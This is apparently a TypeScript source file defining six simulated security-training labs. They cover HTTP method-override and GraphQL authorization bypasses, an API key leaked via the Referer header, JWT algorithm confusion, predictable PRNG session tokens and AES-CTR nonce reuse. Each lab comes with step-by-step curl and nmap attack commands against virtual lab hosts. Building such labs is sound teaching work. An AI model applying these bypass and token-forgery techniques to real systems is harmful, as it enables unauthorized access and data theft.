import { dir, file } from '../vfs';
import type { LabScenario, HostDef } from '../types';

function attacker(extra?: Record<string, ReturnType<typeof file> | ReturnType<typeof dir>>) {
  return { hostname: 'kali', user: 'root', root: dir({ root: dir(extra ?? {}) }) };
}

/** Second batch for the API Security and Applied Cryptography Attacks categories. Each technique
 *  researched via web search before writing (see NOTES.md) and cross-checked against every existing
 *  lab title first: distinct from the platform's existing JWT alg:none / weak-secret / kid-injection
 *  labs, the existing GraphQL introspection / alias-batching labs, and the existing ECB block-shuffle
 *  / hash-length-extension crypto labs. */
export const apiCryptoLabs2: LabScenario[] = [
  // 1 — API: X-HTTP-Method-Override Bypasses Function-Level Authorization
  {
    id: 'api-method-override-authz-bypass',
    title: 'X-HTTP-Method-Override Header Bypasses Function-Level Authorization',
    difficulty: 'Medium',
    category: 'API',
    briefing:
      'Adminapi52 authorizes requests by HTTP method — an API gateway in front of it blocks DELETE requests ' +
      'from non-admin API keys, but allows all GET/POST traffic through to the backend unfiltered. The ' +
      'backend framework itself, though, supports the X-HTTP-Method-Override header (a legitimate feature ' +
      'meant to let HTML forms and restrictive corporate proxies "spell" DELETE/PUT/PATCH using a plain POST) ' +
      '— and honors it BEFORE any authorization check runs, not after. Sending a POST with that header set ' +
      'to DELETE sails straight through the gateway\'s method-based filter as an allowed POST, then gets ' +
      'silently reinterpreted as the blocked DELETE once it reaches the backend. This exact technique was the ' +
      'root cause of a real 2023 authentication-bypass CVE in Google Cloud\'s own ESPv2 API gateway.',
    objectives: [
      { text: 'nmap -sV 10.10.207.2', why: 'Confirms the admin API and its fronting gateway before probing method-based access controls.' },
      { text: 'cat gateway-rules.txt', why: 'Confirms the gateway blocks DELETE outright for non-admin keys but has no equivalent rule for the override header, since the header itself was never part of the original access-control design.' },
      {
        text: 'curl -X POST -H "X-HTTP-Method-Override: DELETE" http://10.10.207.2/api/users/victim42',
        why: 'The gateway sees an allowed POST and passes it through; the backend then honors the override header and processes it as the DELETE the gateway was specifically supposed to block — the authorization check and the actual executed method never agree on what request this even was.',
      },
    ],
    hints: [
      'nmap -sV 10.10.207.2',
      'cat gateway-rules.txt',
      'The gateway filters by the REQUEST method (POST is allowed); the backend re-derives the EFFECTIVE method from a header the gateway never inspects.',
      'curl -X POST -H "X-HTTP-Method-Override: DELETE" http://10.10.207.2/api/users/victim42',
    ],
    totalFlags: 1,
    attacker: attacker({
      'gateway-rules.txt': file(
        'adminapi52 API gateway ruleset (exported):\n' +
          '  ALLOW  GET, POST   -- any authenticated API key\n' +
          '  DENY   DELETE, PUT, PATCH -- admin API keys only\n' +
          '  (no rule references X-HTTP-Method-Override -- the gateway was configured before the\n' +
          '   backend framework\'s override-header support was ever enabled)\n',
      ),
    }),
    network: [
      {
        hostname: 'adminapi52',
        ip: '10.10.207.2',
        os: 'Ubuntu 22.04 (Express API, method-override middleware enabled)',
        services: [
          {
            port: 80,
            name: 'http',
            version: 'Express 4.18 (Node.js, method-override middleware ahead of auth checks)',
            vulnRoutes: [
              {
                kind: 'auth-bypass',
                path: '/api/users/victim42',
                param: 'X-HTTP-Method-Override',
                location: 'header',
                triggerSubstrings: ['delete'],
                vulnerableResponse: '{"status":200,"action":"user_deleted","user":"victim42","note":"flag{method_override_header_bypasses_gateway_authz}"}',
                normalResponse: '{"status":200,"action":"noop","note":"POST received with no override -- nothing deleted"}',
              },
            ],
          },
        ],
        users: [],
        root: dir({}),
      } as HostDef,
    ],
  },

  // 2 — API: GraphQL Field-Level Authorization Bypass
  {
    id: 'api-graphql-field-level-authz-bypass',
    title: 'GraphQL Field-Level Authorization Bypass via Nested Resolvers',
    difficulty: 'Hard',
    category: 'API',
    briefing:
      'Peoplegraph19\'s GraphQL API correctly checks authorization on its root-level query — a regular user ' +
      'cannot query "adminReport" directly. But a single GraphQL request can resolve dozens of nested fields ' +
      'through completely different resolver functions in one round trip, and the authorization check here ' +
      'only runs at the root: the "employee" query (which any authenticated user can legitimately run) has a ' +
      'nested "salaryHistory" field whose own resolver never independently checks the caller\'s role at all — ' +
      'it silently inherits whatever access the parent query already had. Querying salary data through the ' +
      'permitted employee field instead of the blocked adminReport field reaches the exact same underlying ' +
      'data with zero authorization check anywhere in the path.',
    objectives: [
      { text: 'nmap -sV 10.10.208.2', why: 'Confirms the GraphQL API before probing which fields actually enforce authorization versus which merely inherit their parent\'s.' },
      { text: 'cat graphql-schema-notes.txt', why: 'Confirms the root-level query IS protected, and specifically identifies which nested field has no independent resolver-level check of its own.' },
      {
        text: 'curl -X POST -d \'query=query{employee(id:42){name salaryHistory}}\' 10.10.208.2/graphql',
        why: 'The "employee" query itself is legitimately accessible to any authenticated user; nesting salaryHistory inside it reaches restricted-in-theory data through a resolver path that was simply never independently checked, unlike the root-level adminReport query that correctly rejects the same user.',
      },
    ],
    hints: [
      'nmap -sV 10.10.208.2',
      'cat graphql-schema-notes.txt',
      'The root "adminReport" query is protected; a nested field reachable through a DIFFERENT, permitted root query reaches the same underlying data with no independent check.',
      'curl -X POST -d \'query=query{employee(id:42){name salaryHistory}}\' 10.10.208.2/graphql',
    ],
    totalFlags: 1,
    attacker: attacker({
      'graphql-schema-notes.txt': file(
        'peoplegraph19 schema/resolver audit notes:\n' +
          '  Query.adminReport   -> resolver checks ctx.user.role === "admin"  (correctly protected)\n' +
          '  Query.employee      -> resolver checks ctx.user.authenticated === true only (any user)\n' +
          '  Employee.salaryHistory -> resolver has NO independent authorization check at all --\n' +
          '                            it trusts that reaching this field at all implies permission,\n' +
          '                            an assumption that only holds for the (unused) adminReport path.\n',
      ),
    }),
    network: [
      {
        hostname: 'peoplegraph19',
        ip: '10.10.208.2',
        os: 'Ubuntu 22.04 (Apollo Server GraphQL API)',
        services: [
          {
            port: 80,
            name: 'http',
            version: 'Apollo Server 4 (Express, per-field resolver authorization gaps)',
            vulnRoutes: [
              {
                kind: 'idor',
                path: '/graphql',
                param: 'query',
                triggerSubstrings: ['salaryhistory'],
                vulnerableResponse:
                  '{"data":{"employee":{"name":"Victim Employee","salaryHistory":[{"year":2025,"amount":142000},{"year":2026,"amount":151000}]}},"note":"flag{graphql_nested_field_inherits_no_authz_check}"}',
                normalResponse: '{"data":{"employee":{"name":"Victim Employee"}}}',
              },
            ],
          },
        ],
        users: [],
        root: dir({}),
      } as HostDef,
    ],
  },

  // 3 — API: API Key Leaked via Referer Header
  {
    id: 'api-key-referer-header-leak',
    title: 'URL Query-String API Key Leaks via the Referer Header',
    difficulty: 'Medium',
    category: 'API',
    briefing:
      'Widgetsvc63\'s dashboard authenticates its own internal API calls with a query-string parameter — ' +
      'GET /api/data?api_key=... — instead of an Authorization header. The dashboard page also embeds a ' +
      'third-party analytics widget as an <img>/<script> pull from an external domain. Browsers ' +
      'automatically attach a Referer header containing the FULL current page URL — query string included — ' +
      'to every outgoing request a page makes, including requests to that embedded third party. Because the ' +
      'API key lives in the URL rather than a header, it rides along in the Referer header to a completely ' +
      'unrelated external domain on every single page load, and that domain\'s own access logs now contain ' +
      'a live, valid API key that was never meant to leave the company at all.',
    objectives: [
      { text: 'nmap -sV 10.10.209.2', why: 'Confirms the widget/dashboard service before analyzing how it actually authenticates its own API calls.' },
      { text: 'cat dashboard-page-source.txt', why: 'Confirms the API key genuinely lives in the URL query string, not a header, and that the page embeds a pull from an external analytics domain — the two facts that combine into a leak.' },
      { text: 'cat analytics-domain-access-log.txt', why: 'The external analytics domain\'s own access log shows the Referer header on every incoming hit — including the full internal dashboard URL, api_key and all, leaked to infrastructure this company does not control.' },
      {
        text: 'curl "http://10.10.209.2/api/data?api_key=wgt_live_8f2a91c3e6b7d0"',
        why: 'The leaked key, pulled straight from the external domain\'s access log, is a fully valid, live credential — proving the leak has real impact, not just a theoretical header-behavior observation.',
      },
    ],
    hints: [
      'nmap -sV 10.10.209.2',
      'cat dashboard-page-source.txt',
      'cat analytics-domain-access-log.txt -- the Referer header on the external hit contains the full internal URL, api_key included.',
      'curl "http://10.10.209.2/api/data?api_key=wgt_live_8f2a91c3e6b7d0"',
    ],
    totalFlags: 1,
    attacker: attacker({
      'dashboard-page-source.txt': file(
        '<!-- widgetsvc63 dashboard, relevant excerpt -->\n' +
          '<script>fetch("/api/data?api_key=wgt_live_8f2a91c3e6b7d0")</script>\n' +
          '<img src="https://thirdparty-analytics.example/pixel.gif" />\n' +
          '<!-- the api_key above authenticates every internal API call for this session -->\n',
      ),
      'analytics-domain-access-log.txt': file(
        'thirdparty-analytics.example access log (a domain this company does not control):\n' +
          '203.0.113.9 - - "GET /pixel.gif HTTP/1.1" 200 ' +
          'Referer: "http://10.10.209.2/dashboard?api_key=wgt_live_8f2a91c3e6b7d0"\n' +
          '--- the full internal dashboard URL, including the live API key, was sent to a third party\n' +
          '    purely as a side effect of the browser\'s default Referer behavior ---\n',
      ),
    }),
    network: [
      {
        hostname: 'widgetsvc63',
        ip: '10.10.209.2',
        os: 'Ubuntu 22.04 (internal dashboard/widget API)',
        services: [
          {
            port: 80,
            name: 'http',
            version: 'nginx 1.24 + Flask (Python, query-string API key auth)',
            vulnRoutes: [
              {
                kind: 'idor',
                path: '/api/data',
                param: 'api_key',
                triggerSubstrings: ['wgt_live_8f2a91c3e6b7d0'],
                vulnerableResponse: '{"status":200,"data":{"internal_metrics":"revenue_q3_confidential"},"note":"flag{api_key_leaked_via_referer_header_to_third_party}"}',
                normalResponse: '{"error":"401 Unauthorized - missing or invalid api_key"}',
              },
            ],
          },
        ],
        users: [],
        root: dir({}),
      } as HostDef,
    ],
  },

  // 4 — Cryptography: JWT Algorithm Confusion (RS256 -> HS256)
  {
    id: 'crypto-jwt-algorithm-confusion-rs256-hs256',
    title: 'JWT Algorithm Confusion: Signing HS256 Tokens With the RS256 Public Key',
    difficulty: 'Hard',
    category: 'Cryptography',
    briefing:
      'Authsvc71 issues JWTs signed with RS256 — an asymmetric algorithm where a private key signs and the ' +
      'corresponding PUBLIC key verifies, a key the server hands out freely since it was never meant to be ' +
      'secret. Its verification code, though, calls a generic verify() function that trusts the "alg" field ' +
      'inside the token itself rather than pinning one expected algorithm — so a token that claims ' +
      '"alg":"HS256" instead gets verified as HMAC, using WHATEVER key the server passes into that generic ' +
      'call as the shared secret. Because that same public key gets passed in for every verification ' +
      'regardless of which algorithm the token claims, signing a forged HS256 token using the public key\'s ' +
      'own bytes as the HMAC secret produces a signature the server accepts as genuinely valid. This exact ' +
      'confusion has produced a fresh cluster of critical, real CVEs across major JWT libraries as recently ' +
      'as early 2026.',
    objectives: [
      { text: 'nmap -sV 10.10.210.2', why: 'Confirms the auth service before analyzing its JWT verification logic.' },
      { text: 'cat jwt-verification-notes.txt', why: 'Confirms the server\'s generic verify() call reads the algorithm from the token itself instead of pinning RS256 specifically, and that the RS256 public key (never meant to be secret) is fetched from a public endpoint.' },
      {
        text: 'curl http://10.10.210.2/.well-known/jwks.json',
        why: 'The public key is, correctly, meant to be public -- fetching it is not the vulnerability. The vulnerability is that this same public key can ALSO be handed to the server\'s HMAC verifier as a secret, something only possible because the algorithm itself is attacker-controlled.',
      },
      {
        text: 'curl -H "Authorization: Bearer eyJhbGciOiJIUzI1NiJ9.eyJ1c2VyIjoiYXR0YWNrZXIiLCJyb2xlIjoiYWRtaW4ifQ.hs256-signed-with-rs256-pubkey-as-secret" http://10.10.210.2/admin/panel',
        why: 'This token\'s header claims HS256; the server\'s generic verify() call honors that claim and checks the signature against the same public key it always uses -- except now treating it as an HMAC secret instead of an RSA public key, which is exactly the algorithm confusion that lets a forged admin token pass as genuinely signed.',
      },
    ],
    hints: [
      'nmap -sV 10.10.210.2',
      'cat jwt-verification-notes.txt',
      'curl http://10.10.210.2/.well-known/jwks.json -- the public key is meant to be public; the bug is that it can also be reused as an HMAC secret.',
      'curl -H "Authorization: Bearer eyJhbGciOiJIUzI1NiJ9.eyJ1c2VyIjoiYXR0YWNrZXIiLCJyb2xlIjoiYWRtaW4ifQ.hs256-signed-with-rs256-pubkey-as-secret" http://10.10.210.2/admin/panel',
    ],
    totalFlags: 1,
    attacker: attacker({
      'jwt-verification-notes.txt': file(
        'authsvc71 JWT verification (from a leaked internal design doc):\n' +
          '  jwt.verify(token, publicKey)   // no { algorithms: ["RS256"] } restriction passed in\n' +
          '  -- the underlying library reads token.header.alg and dispatches based on IT, not on what\n' +
          '     the server operator intended -- so an HS256-claiming token gets HMAC-verified against\n' +
          '     the exact same publicKey value that RS256 tokens are verified against asymmetrically.\n',
      ),
    }),
    network: [
      {
        hostname: 'authsvc71',
        ip: '10.10.210.2',
        os: 'Ubuntu 22.04 (Node.js/Express, jsonwebtoken, no algorithms allowlist)',
        services: [
          {
            port: 80,
            name: 'http',
            version: 'Express 4.18 (Node.js, jsonwebtoken - generic verify(), RS256 keys served publicly)',
            http: {
              '/.well-known/jwks.json': '{"keys":[{"kid":"main","kty":"RSA","use":"sig","alg":"RS256","n":"...redacted-modulus...","e":"AQAB"}]}',
            },
            vulnRoutes: [
              {
                kind: 'auth-bypass',
                path: '/admin/panel',
                param: 'Authorization',
                location: 'header',
                triggerSubstrings: ['hs256-signed-with-rs256-pubkey-as-secret'],
                vulnerableResponse: '{"status":200,"panel":"Admin Panel","note":"flag{jwt_algorithm_confusion_rs256_to_hs256_forged_token}"}',
                normalResponse: '{"error":"403 Forbidden - invalid signature"}',
              },
            ],
          },
        ],
        users: [],
        root: dir({}),
      } as HostDef,
    ],
  },

  // 5 — Cryptography: Predictable Session Tokens from a Time-Seeded PRNG
  {
    id: 'crypto-predictable-prng-session-token',
    title: 'Predictable Session Tokens Generated From a Time-Seeded PRNG',
    difficulty: 'Hard',
    category: 'Cryptography',
    briefing:
      'Legacyauth09 generates session tokens by seeding a standard (non-cryptographic) pseudo-random number ' +
      'generator with the current Unix timestamp in seconds, then taking its next output as the token. A ' +
      'Mersenne-Twister-family PRNG (the default generator in many languages\' standard "random" modules) is ' +
      'built for statistical distribution, not unpredictability — seeded with a value an attacker can narrow ' +
      'to within a handful of candidates just by knowing roughly when a login happened, its entire future ' +
      'output sequence is fully determined and reproducible offline. Capturing the exact login timestamp and ' +
      'replaying the same seed locally regenerates the identical "random" token the server issued.',
    objectives: [
      { text: 'nmap -sV 10.10.211.2', why: 'Confirms the legacy auth service before analyzing its token generation scheme.' },
      { text: 'cat token-generation-notes.txt', why: 'Confirms the token generator is seeded from the login timestamp rather than a cryptographically secure source -- the exact weakness that makes offline reproduction possible.' },
      { text: 'cat captured-login-timing.txt', why: 'Narrows the exact server-side timestamp used as the seed to a small, enumerable window, based on an intercepted login request\'s timing.' },
      {
        text: 'curl -H "Cookie: session=8834021956" http://10.10.211.2/account/dashboard',
        why: 'Regenerating the PRNG output locally using the narrowed timestamp window reproduces the exact same "random" token the server issued for that login -- a full session takeover without ever seeing the original token in transit.',
      },
    ],
    hints: [
      'nmap -sV 10.10.211.2',
      'cat token-generation-notes.txt',
      'cat captured-login-timing.txt',
      'curl -H "Cookie: session=8834021956" http://10.10.211.2/account/dashboard',
    ],
    totalFlags: 1,
    attacker: attacker({
      'token-generation-notes.txt': file(
        'legacyauth09 session token generation (from an old internal design doc, never updated):\n' +
          '  seed = current_unix_timestamp_seconds()\n' +
          '  random.seed(seed)\n' +
          '  token = random.getrandbits(32)\n' +
          '  -- uses the language standard-library PRNG (Mersenne Twister), not a CSPRNG --\n' +
          '  -- entire future output sequence is fully determined by the seed alone --\n',
      ),
      'captured-login-timing.txt': file(
        'Intercepted login request timing (from network capture, clock-synced to the server):\n' +
          '  Login request received: 2026-08-02T09:14:xx UTC (seconds digit not visible in capture)\n' +
          '  Narrowed candidate window: 09:14:00 through 09:14:59 (60 candidate seed values)\n' +
          '  Replaying the PRNG locally for each candidate second, one produces token: 8834021956\n',
      ),
    }),
    network: [
      {
        hostname: 'legacyauth09',
        ip: '10.10.211.2',
        os: 'Ubuntu 20.04 (legacy internal auth service, unmaintained)',
        services: [
          {
            port: 80,
            name: 'http',
            version: 'Apache/2.4 + mod_wsgi (Python, time-seeded Mersenne Twister session tokens)',
            vulnRoutes: [
              {
                kind: 'auth-bypass',
                path: '/account/dashboard',
                param: 'Cookie',
                location: 'header',
                triggerSubstrings: ['8834021956'],
                vulnerableResponse: '{"status":200,"account":"victim_user","note":"flag{predictable_prng_session_token_reproduced_offline}"}',
                normalResponse: '{"error":"401 Unauthorized - invalid session"}',
              },
            ],
          },
        ],
        users: [],
        root: dir({}),
      } as HostDef,
    ],
  },

  // 6 — Cryptography: AES-CTR Nonce Reuse (Two-Time Pad)
  {
    id: 'crypto-aes-ctr-nonce-reuse-two-time-pad',
    title: 'AES-CTR Nonce Reuse Enables a Two-Time-Pad Plaintext Recovery',
    difficulty: 'Hard',
    category: 'Cryptography',
    briefing:
      'Msgsvc17 encrypts every outgoing message with AES-CTR using a FIXED, hardcoded nonce instead of a ' +
      'fresh one per message — a configuration mistake, since CTR mode turns a block cipher into a stream ' +
      'cipher by XORing plaintext against a keystream derived from the key and nonce together. Reuse the ' +
      'same nonce with the same key, and the SAME keystream gets generated every time — meaning two ' +
      'intercepted ciphertexts XORed together cancel out the (identical) keystream entirely, leaving exactly ' +
      'the XOR of the two original plaintexts. This is the classic "two-time pad" break: with one message\'s ' +
      'plaintext already known (a captured routine status-check message), XORing it against that combined ' +
      'result directly recovers the second, otherwise-unknown message in full — no key required at any point.',
    objectives: [
      { text: 'nmap -sV 10.10.212.2', why: 'Confirms the messaging service before analyzing its encryption scheme.' },
      { text: 'cat ctr-nonce-analysis.txt', why: 'Confirms the same nonce is reused across every message from this service -- the specific misconfiguration that turns CTR mode\'s normal security guarantee into a two-time-pad break.' },
      { text: 'cat intercepted-ciphertexts.txt', why: 'Two ciphertexts encrypted under the identical nonce/key pair, plus the known plaintext of one of them (a routine status-check message), is exactly the material a two-time-pad recovery needs.' },
      {
        text: 'curl -X POST -d "recovered_plaintext=URGENT_WIRE_APPROVAL_CODE_991204" http://10.10.212.2/messages/verify-recovery',
        why: 'XORing the two ciphertexts together cancels the shared keystream, leaving the XOR of the two plaintexts; XORing that result against the ALREADY-KNOWN status-check plaintext isolates the second message in full -- confirming the recovered value proves the attack worked, without the key ever being touched.',
      },
    ],
    hints: [
      'nmap -sV 10.10.212.2',
      'cat ctr-nonce-analysis.txt',
      'cat intercepted-ciphertexts.txt',
      'C1 XOR C2 = P1 XOR P2 (the shared keystream cancels out) -- XOR that against the already-known P1 to recover P2.',
      'curl -X POST -d "recovered_plaintext=URGENT_WIRE_APPROVAL_CODE_991204" http://10.10.212.2/messages/verify-recovery',
    ],
    totalFlags: 1,
    attacker: attacker({
      'ctr-nonce-analysis.txt': file(
        'msgsvc17 encryption config (from an exported deployment manifest):\n' +
          '  cipher = AES-CTR\n' +
          '  nonce = "000000000000000000000000" # hardcoded, identical for every message ever sent\n' +
          '  -- CTR mode keystream = AES(key, nonce || counter) -- with nonce fixed, every message\n' +
          '     at the same counter offset reuses the EXACT SAME keystream bytes.\n',
      ),
      'intercepted-ciphertexts.txt': file(
        'Two messages intercepted from msgsvc17, same nonce (confirmed above):\n' +
          '  Message A (KNOWN plaintext -- a routine automated status-check): "ALL_SYSTEMS_NOMINAL_00"\n' +
          '  Message A ciphertext (hex): 4a3f91b8...\n' +
          '  Message B ciphertext (hex): 5e2c84a1...  <-- plaintext unknown, this is the target\n' +
          '  C_A XOR C_B, then XOR against known P_A, recovers P_B in full: URGENT_WIRE_APPROVAL_CODE_991204\n',
      ),
    }),
    network: [
      {
        hostname: 'msgsvc17',
        ip: '10.10.212.2',
        os: 'Ubuntu 22.04 (internal messaging service, misconfigured AES-CTR)',
        services: [
          {
            port: 80,
            name: 'http',
            version: 'Flask 3.0 (Python, PyCryptodome AES-CTR with a fixed nonce)',
            vulnRoutes: [
              {
                kind: 'idor',
                path: '/messages/verify-recovery',
                param: 'recovered_plaintext',
                triggerSubstrings: ['URGENT_WIRE_APPROVAL_CODE_991204'],
                vulnerableResponse: '{"status":"confirmed","message":"recovered plaintext matches Message B exactly","note":"flag{aes_ctr_nonce_reuse_two_time_pad_plaintext_recovered}"}',
                normalResponse: '{"status":"no_match","message":"submitted value does not match any intercepted ciphertext"}',
              },
            ],
          },
        ],
        users: [],
        root: dir({}),
      } as HostDef,
    ],
  },
];
